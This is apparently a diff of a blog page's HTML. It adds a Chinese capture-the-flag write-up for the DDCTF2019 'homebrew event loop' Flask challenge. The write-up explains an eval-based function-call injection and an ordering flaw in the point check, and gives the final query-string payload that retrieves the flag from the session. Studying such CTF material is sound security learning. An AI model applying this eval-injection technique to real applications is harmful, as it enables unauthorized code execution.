class="hljs-keyword">if</span> num_items &lt;= <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="hljs-built_in">format</span>(args[<span class="hljs-number">0</span>])<br>    session[<span class="hljs-string">&#x27;num_items&#x27;</span>] += num_items<br>    trigger_event([<span class="hljs-string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        num_items), <span class="hljs-string">&#x27;action:view;index&#x27;</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">consume_point_function</span>(<span class="hljs-params">args</span>):<br>    point_to_consume = <span class="hljs-built_in">int</span>(args[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;points&#x27;</span>] &lt; point_to_consume:<br>        <span class="hljs-keyword">raise</span> RollBackException()<br>    session[<span class="hljs-string">&#x27;points&#x27;</span>] -= point_to_consume<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_flag_function</span>(<span class="hljs-params">args</span>):<br>    flag = args[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_handler</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;num_items&#x27;</span>] &gt;= <span class="hljs-number">5</span>:<br>        <span class="hljs-comment"># show_flag_function has been disabled, no worries</span><br>        trigger_event(<span class="hljs-string">&#x27;func:show_flag;&#x27;</span> + FLAG())<br>    trigger_event(<span class="hljs-string">&#x27;action:view;index&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p>首先先看看怎么获取flag</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">166 </span><span class="hljs-keyword">def</span> get_flag_handler(args):<br><span class="hljs-symbol">167 </span>    <span class="hljs-keyword">if</span> session[<span class="hljs-comment">&#x27;num_items&#x27;] &gt;= 5:</span><br><span class="hljs-symbol">168 </span>        # show_flag_function has been disabled, no worries<br><span class="hljs-symbol">169 </span>        trigger_event(<span class="hljs-comment">&#x27;func:show_flag;&#x27; + FLAG())</span><br><span class="hljs-symbol">170 </span>    trigger_event(<span class="hljs-comment">&#x27;action:view;index&#x27;)</span><br></code></pre></td></tr></table></figure>
+
+<p>session[‘num_items’] 大于等于5的话，就会把flag放在session里面</p>
+<hr>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">153 </span><span class="hljs-keyword">def</span> consume_point_function(args):<br><span class="hljs-symbol">154 </span>    point_to_consume = <span class="hljs-keyword">int</span>(args[<span class="hljs-number">0</span>])<br><span class="hljs-symbol">155 </span>    <span class="hljs-keyword">if</span> session[<span class="hljs-comment">&#x27;points&#x27;] &lt; point_to_consume:</span><br><span class="hljs-symbol">156 </span>        raise RollBackException()<br><span class="hljs-symbol">157 </span>    session[<span class="hljs-comment">&#x27;points&#x27;] -= point_to_consume</span><br></code></pre></td></tr></table></figure>
+
+<p>这个函数会先判断session中的points是否小于我们想要购买的数量。如果小于的话就减掉。例如我们购买5个flag，但是只有3个金币，会先购买5个吗，然后判断钱是不是够，不够就再减去。</p>
+<p>然后再从路由来看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params">url_prefix+<span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-comment">#使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">entry_point</span>(): <br>    querystring = urllib.unquote(request.query_string) <br>    <span class="hljs-comment">#urllib.unquote  ：urlencode逆向，就是把%40转化为@（字符串被当作url提交时会被自动进行url编码处理，在python里也有个urllib.urlencode的方法，可以很方便的把字典形式的参数进行url编码）</span><br>    <span class="hljs-comment">#request.query_string：它得到的是，url中？后面所有的值，最为一个字符串，比如action:index;False#False</span><br>    request.event_queue = [] <span class="hljs-comment">#定义一个数组</span><br>    <span class="hljs-keyword">if</span> querystring == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">not</span> querystring.startswith(<span class="hljs-string">&#x27;action:&#x27;</span>)) <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(querystring) &gt; <span class="hljs-number">100</span>: <br>    <span class="hljs-comment">#如果这个url？后面的值为空 或者 这个url？后面的值不是以action开头 或者 这个url？后面的值长度大于100  </span><br>        querystring = <span class="hljs-string">&#x27;action:index;False#False&#x27;</span> <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;num_items&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session: <span class="hljs-comment">#如果session里面还没有num_items这个key</span><br>        session[<span class="hljs-string">&#x27;num_items&#x27;</span>] = <span class="hljs-number">0</span> <span class="hljs-comment">#钻石数量</span><br>        session[<span class="hljs-string">&#x27;points&#x27;</span>] = <span class="hljs-number">3</span> <span class="hljs-comment">#积分数量</span><br>        session[<span class="hljs-string">&#x27;log&#x27;</span>] = [] <br>    request.prev_session = <span class="hljs-built_in">dict</span>(session) <span class="hljs-comment">#新建一个字典request.prev_session使其的值为字典session的值</span><br>    trigger_event(querystring) <span class="hljs-comment">#调用了trigger_event</span><br>    <span class="hljs-keyword">return</span> execute_event_loop() <span class="hljs-comment">#进入到execute_event_loop函数</span><br></code></pre></td></tr></table></figure>
+
+<p>这里调用了trigger_event函数</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">def trigger_event(<span class="hljs-keyword">event</span>):<br>    session[<span class="hljs-string">&#x27;log&#x27;</span>].append(<span class="hljs-keyword">event</span>)#将<span class="hljs-keyword">event</span>添加到session[<span class="hljs-string">&#x27;log&#x27;</span>]这个列表中<br>    <span class="hljs-keyword">if</span> len(session[<span class="hljs-string">&#x27;log&#x27;</span>]) &gt; <span class="hljs-number">5</span>: #如果列表session[<span class="hljs-string">&#x27;log&#x27;</span>]中的元素数量大于等于<span class="hljs-number">5</span><br>        session[<span class="hljs-string">&#x27;log&#x27;</span>] = session[<span class="hljs-string">&#x27;log&#x27;</span>][-<span class="hljs-number">5</span>:]#session[<span class="hljs-string">&#x27;log&#x27;</span>]取后五个元素<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">type</span>(<span class="hljs-keyword">event</span>) == <span class="hljs-keyword">type</span>([]): #如果<span class="hljs-keyword">event</span>的类型是列表<br>        request.event_queue += <span class="hljs-keyword">event</span> #两个列表相加，在列表request.event_queue中添加一个元素 <span class="hljs-keyword">event</span><br>    <span class="hljs-keyword">else</span>:<br>        request.event_queue.append(<span class="hljs-keyword">event</span>)  #在列表request.event_queue中添加一个元素 <span class="hljs-keyword">event</span><br></code></pre></td></tr></table></figure>
+
+<p>再跟进一下execute_event_loop函数</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">else</span>:<br>    is_action = event<span class="hljs-selector-attr">[0]</span> == <span class="hljs-string">&#x27;a&#x27;</span><br>    action = <span class="hljs-built_in">get_mid_str</span>(event, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>)<br>    args = <span class="hljs-built_in">get_mid_str</span>(event, action+<span class="hljs-string">&#x27;;&#x27;</span>)<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;#&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>action的话会直接返回第一个;之后的内容<br>参数这里用#做了一下分割，并返回一个列表到args里</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">event_handler</span> = eval(action + (<span class="hljs-string">&#x27;_handler&#x27;</span> if is_action else <span class="hljs-string">&#x27;_function&#x27;</span>)) <br><span class="hljs-attr">ret_val</span> = event_handler(args) <br></code></pre></td></tr></table></figure>
+
+<p>action的话会直接返回第一个;之后的内容<br>参数这里用#做了一下分割，并返回一个列表到args里</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">event_handler</span> = eval(action + (<span class="hljs-string">&#x27;_handler&#x27;</span> if is_action else <span class="hljs-string">&#x27;_function&#x27;</span>)) <br><span class="hljs-attr">ret_val</span> = event_handler(args) <br></code></pre></td></tr></table></figure>
+
+<p>这里有一个任意函数调用。action传入之后会有一个后缀拼接，但是可以直接用#绕过，因为是eval执行的，eval会把这个字符串当作<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=python&spm=1001.2101.3001.7020">python</a>代码执行，所以后缀就绕过了。所以可以action,trigger_event#;来调用自己绕过后缀拼接。从而执行多个函数</p>
+<p>发现存在逻辑漏洞：就是我们的钱无论够不够，它都会给我们先加上，然后扣掉<br>我们发现第148行，无论我们的钱够不够，都先给我们加上，之后再扣掉</p>
+<p><strong>若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。</strong><br><strong>根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。</strong></p>
+<p>最终payload为：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">?action:trigger_event%<span class="hljs-number">23</span>;action:buy;<span class="hljs-number">5%</span><span class="hljs-number">23</span>action:get_flag;<br></code></pre></td></tr></table></figure>
+
+<p>然后使用bp抓包可以抓到session</p>
+<p><img src="/../image/DDCTF2019-homebrew-event-loop-2.png"></p>
+<p>然后使用解密脚本解密</p>
+<p><img src="/../image/DDCTF2019-homebrew-event-loop-3.png"></p>
+<p>得到</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Z<span class="hljs-symbol">nVuYzpzaG93</span>X<span class="hljs-number">2</span>ZsYWc<span class="hljs-number">7</span>ZmxhZ<span class="hljs-number">3</span>sw<span class="hljs-symbol">NTE4</span><span class="hljs-name">M2</span>QwZC<span class="hljs-number">0</span>wMjRkLTQ<span class="hljs-number">1</span>ZmMtOGJlMy<span class="hljs-number">1</span>iMT<span class="hljs-name">M0</span><span class="hljs-symbol">NGEzMTQ5</span>MjJ<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>
+
+<p>解密之后得到flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>:show_flag;flag&#123;<span class="hljs-number">05183</span>d0d-<span class="hljs-number">024</span>d-<span class="hljs-number">45</span>fc-<span class="hljs-number">8</span>be3-b1344a314922&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
     <div id="comments">
     <script>
         {
@@ -2654,6 +2820,13 @@
     </script>
 </div>
 
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -2662,11 +2835,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 </body>
